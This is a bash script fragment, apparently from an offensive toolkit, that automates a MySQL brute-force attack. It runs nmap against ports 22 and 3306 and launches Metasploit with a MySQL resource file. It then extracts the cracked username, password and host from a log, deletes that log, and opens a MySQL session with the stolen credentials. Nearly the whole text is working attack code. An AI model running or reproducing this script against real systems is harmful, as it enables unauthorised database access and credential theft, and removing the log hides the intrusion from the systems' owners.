printf "[${BRIGHT}${BLUE}MySQL Bruteforce${NORMAL}]:\n"
SECONDS=0
#launch metasploit with script file -- not yet implemented
OUTFILE="arp-scan.xml"
nmap -p22,3306 $ARPRESULT -oX $OUTFILE
msfconsole -r msfc_mysql_footprint.rc

printf "...exploit completed in ${BLUE}$SECONDS seconds${NORMAL}!\n"

logparse=$(cat mylog.log | grep Success)

#log into mysql with found credentials
Username=$(echo $logparse | grep -oP "(?<=Success: ').*(?=:)")
Password=$(echo $logparse | grep -oP "(?<=$Username:).*(?=')")
Host=$(echo $logparse | grep -oP "(?<=0m ).*(?=:3306 MYSQL - Success:)" mylog.log)

rm -f mylog.log

# open new terminal using a mysql client
gnome-terminal --command="mysql -h $Host -u $Username --password=$Password" &
